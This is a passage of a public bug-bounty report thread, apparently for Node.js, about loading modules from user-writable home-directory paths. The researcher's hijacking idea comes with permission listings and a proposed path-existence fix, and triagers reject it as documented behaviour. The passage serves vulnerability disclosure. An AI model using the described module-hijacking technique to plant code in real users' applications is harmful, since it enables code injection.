safer.\u003cbr\u003e\nWindows has a DACL\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eC:\\Users\\cdpyt\u0026gt;icacls %userprofile%\nC:\\Users\\cdpyt NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n               BUILTIN\\Administrators:(OI)(CI)(F)\n               DESKTOP-H9K1B8N\\cdpyt:(OI)(CI)(F)\n               Everyone:(RX)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e%userprofile% is writeable with \u003ccode\u003eDESKTOP-H9K1B8N\\cdpyt:(OI)(CI)(F)\u003c/code\u003e permission\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eC:\\Users\\cdpyt\u0026gt;icacls \u0026quot;%ProgramFiles%\u0026quot;\nC:\\Program Files NT SERVICE\\TrustedInstaller:(F)\n                 NT SERVICE\\TrustedInstaller:(CI)(IO)(F)\n                 NT AUTHORITY\\SYSTEM:(M)\n                 NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F)\n                 BUILTIN\\Administrators:(M)\n                 BUILTIN\\Administrators:(OI)(CI)(IO)(F)\n                 BUILTIN\\Users:(RX)\n                 BUILTIN\\Users:(OI)(CI)(IO)(GR,GE)\n                 CREATOR OWNER:(OI)(CI)(IO)(F)\n                 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX)\n                 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)\n                 APPLICATION PACKAGE AUTHORITY\\모든 제한된 응용 프로그램 패키지:(RX)\n                 APPLICATION PACKAGE AUTHORITY\\모든 제한된 응용 프로그램 패키지:(OI)(CI)(IO)(GR,GE)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCurrent user is \u003ccode\u003eBUILTIN\\Users:(RX)\u003c/code\u003e so I can\u0026#39;t write under %ProgramFiles% path before gain administrator privileges.\u003c/p\u003e\n\n\u003cp\u003eabove software are trying load to the module from the current installation path.\u003c/p\u003e\n\n\u003cp\u003ein these cases, an attacker can not inject javascript code.\u003c/p\u003e\n\n\u003cp\u003ebecause if an attacker writes to file under \u003ccode\u003e%ProgramFiles%\u003c/code\u003e, they need to bypass UAC.\u003c/p\u003e\n\n\u003cp\u003ebut \u003ccode\u003enode\u003c/code\u003e  added \u003ccode\u003e%userprofile%\\.node_modules\u003c/code\u003e and \u003ccode\u003e%userprofile%\\.node_libraries\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003eso an attacker can write a file without UAC bypass.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve attached simple PoC.\u003c/p\u003e\n\n\u003cp\u003eThank you.  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T18:20:59.638Z","updated_at":"2019-06-26T18:20:59.638Z","actor":{"username":"cdpython","cleared":false,"url":"/cdpython","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":517321,"filename":"node.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/321/8d97267e70fb98193d7aff281d88b92a12df0657/node.mp4?response-content-disposition=attachment%3B%20filename%3D%22node.mp4%22%3B%20filename%2A%3DUTF-8%27%27node.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063113Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=a3d9ac9ad0dcf914879a5fe36ef0d6497ee50462e6f22689952c5efbf42d22c3"}],"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5201728,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Your English is perfectly understandable.\n\nTo be clear, this behaviour is documented and has existed for years: https://nodejs.org/api/modules.html#modules_loading_from_the_global_folders\n\n\u003e \"I understand and agree with your opinion. node.js itself is not a problem. However, many users use many applications built with Electron.\"\n\nYou reported this to the Node.js project, not the Electron project. Shouldn't you report this as described in https://github.com/electron/electron/blob/master/SECURITY.md? They patch node, and could remove the global module paths.\n\n\u003e I think can have a big problem in the node.js client ecosystem.\n\u003e You can inject JavaScript code into software such as slack, discord, vscode\n\nYou cannot inject, not until the following unlikely scenario is arranged:\n1. A package exists that has an invalid (misspelled) require call\n2. The invalid require was never noticed, somehow. Global resolution occurs only if local resolution fails. On machines without the attack js in the global directories, both global and local resolution fails, and a fatal exception is thrown. How did this fatal exception not get noticed?\n3. An attacker has write access to the target user's home directories, and knows they are running an app with this problem.\n","markdown_message":"\u003cp\u003eYour English is perfectly understandable.\u003c/p\u003e\n\n\u003cp\u003eTo be clear, this behaviour is documented and has existed for years: \u003ca title=\"https://nodejs.org/api/modules.html#modules_loading_from_the_global_folders\" href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fapi%2Fmodules.html%23modules_loading_from_the_global_folders\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nodejs.org/api/modules.html#modules_loading_from_the_global_folders\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u0026quot;I understand and agree with your opinion. node.js itself is not a problem. However, many users use many applications built with Electron.\u0026quot;\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYou reported this to the Node.js project, not the Electron project. Shouldn\u0026#39;t you report this as described in \u003ca title=\"https://github.com/electron/electron/blob/master/SECURITY.md\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Felectron%2Felectron%2Fblob%2Fmaster%2FSECURITY.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/electron/electron/blob/master/SECURITY.md\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e? They patch node, and could remove the global module paths.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI think can have a big problem in the node.js client ecosystem.\u003cbr\u003e\nYou can inject JavaScript code into software such as slack, discord, vscode\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYou cannot inject, not until the following unlikely scenario is arranged:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eA package exists that has an invalid (misspelled) require call\u003c/li\u003e\n\u003cli\u003eThe invalid require was never noticed, somehow. Global resolution occurs only if local resolution fails. On machines without the attack js in the global directories, both global and local resolution fails, and a fatal exception is thrown. How did this fatal exception not get noticed?\u003c/li\u003e\n\u003cli\u003eAn attacker has write access to the target user\u0026#39;s home directories, and knows they are running an app with this problem.\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2019-06-26T20:04:11.047Z","updated_at":"2019-06-26T20:04:11.047Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5202987,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good Morning! \n\nI already know an attacker without permission to a victim system cannot create javascript code. \n`Arbitrary file Write` is another vulnerability.\n\nBut I think this is a potential threat to the Windows node client.\nIt is similar to traditional Window DLL Hijacking.\n\nSo I just want to fix this issue. because this is can be exploited like my POC. F517321\n\nin Windows can do like this \nhttps://support.microsoft.com/en-au/help/2389418/secure-loading-of-libraries-to-prevent-dll-preloading-attacks\n```c\nDWORD retval = SearchPath(NULL, \"schannel\", \".dll\", err, result, NULL); \nHMODULE handle = LoadLibrary(result);\n```\n\nI think node also can do this before just added path.\n\n```js\nif (homeDir) {\n    [path.resolve(homeDir, '.node_libraries'),path.resolve(homeDir, '.node_modules')].map(\n\t(p) =\u003e fs.existsSync(p) ? \n                   paths.unshift(p) : \n                   console.log(`${p} is dosn't exsist on the system.`)\n    )\n}\n```\nabove code is safer because it verifies that the path exists before adding it.\n\nand I didn't know Electron has a deal with Security Issue.\n\nI will consider sending this issue to `Electron`\n\nthank you.","markdown_message":"\u003cp\u003eGood Morning! \u003c/p\u003e\n\n\u003cp\u003eI already know an attacker without permission to a victim system cannot create javascript code. \u003cbr\u003e\n\u003ccode\u003eArbitrary file Write\u003c/code\u003e is another vulnerability.\u003c/p\u003e\n\n\u003cp\u003eBut I think this is a potential threat to the Windows node client.\u003cbr\u003e\nIt is similar to traditional Window DLL Hijacking.\u003c/p\u003e\n\n\u003cp\u003eSo I just want to fix this issue. because this is can be exploited like my POC. \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"node.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/321/8d97267e70fb98193d7aff281d88b92a12df0657/node.mp4?response-content-disposition=attachment%3B%20filename%3D%22node.mp4%22%3B%20filename%2A%3DUTF-8%27%27node.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063113Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=a3d9ac9ad0dcf914879a5fe36ef0d6497ee50462e6f22689952c5efbf42d22c3\" data-attachment-type=\"video/mp4\"\u003enode.mp4 (F517321)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ein Windows can do like this \u003cbr\u003e\n\u003ca title=\"https://support.microsoft.com/en-au/help/2389418/secure-loading-of-libraries-to-prevent-dll-preloading-attacks\" href=\"/redirect?url=https%3A%2F%2Fsupport.microsoft.com%2Fen-au%2Fhelp%2F2389418%2Fsecure-loading-of-libraries-to-prevent-dll-preloading-attacks\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://support.microsoft.com/en-au/help/2389418/secure-loading-of-libraries-to-prevent-dll-preloading-attacks\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003eDWORD\u003c/span\u003e \u003cspan class=\"n\"\u003eretval\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eSearchPath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;schannel\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;.dll\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eerr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \n\u003cspan class=\"n\"\u003eHMODULE\u003c/span\u003e \u003cspan class=\"n\"\u003ehandle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eLoadLibrary\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI think node also can do this before just added path.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.node_libraries\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.node_modules\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)].\u003c/span\u003e\u003cspan class=\"nx\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003efs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexistsSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e?\u003c/span\u003e \n                   \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eunshift\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \n                   \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e is dosn\u0026#39;t exsist on the system.`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eabove code is safer because it verifies that the path exists before adding it.\u003c/p\u003e\n\n\u003cp\u003eand I didn\u0026#39;t know Electron has a deal with Security Issue.\u003c/p\u003e\n\n\u003cp\u003eI will consider sending this issue to \u003ccode\u003eElectron\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ethank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-27T02:30:06.392Z","updated_at":"2019-06-27T02:30:06.392Z","actor":{"username":"cdpython","cleared":false,"url":"/cdpython","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5206340,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Hi @cdpython,\n\nBased on your initial description, there do not appear to be any security implications as a direct result of this behavior. As already stated, this is a feature of Nodejs.\n\nYour effort is nonetheless appreciated and we wish that you'll continue to research and submit any future security issues you find. If you disagree, please reply with additional information describing your reasoning.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/cdpython\"\u003e@cdpython\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eBased on your initial description, there do not appear to be any security implications as a direct result of this behavior. As already stated, this is a feature of Nodejs.\u003c/p\u003e\n\n\u003cp\u003eYour effort is nonetheless appreciated and we wish that you\u0026#39;ll continue to research and submit any future security issues you find. If you disagree, please reply with additional information describing your reasoning.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-27T14:01:55.743Z","updated_at":"2019-06-27T14:01:55.743Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6772331,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-14T23:42:26.734Z","updated_at":"2020-01-14T23:42:26.734Z","first_to_agree":true,"actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8262997,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-11T12:19:49.565Z","updated_at":"2020-06-11T12:19:49.565Z","actor":{"username":"cdpython","cleared":false,"url":"/cdpython","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8262998,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-11T12:19:49.612Z","updated_at":"2020-06-11T12:19:49.612Z","actor":{"username":"cdpython","cleared":false,"url":"/cdpython","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/302/695/7c7328c65eed6b2080fd86952825ec3da8a3ff72_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}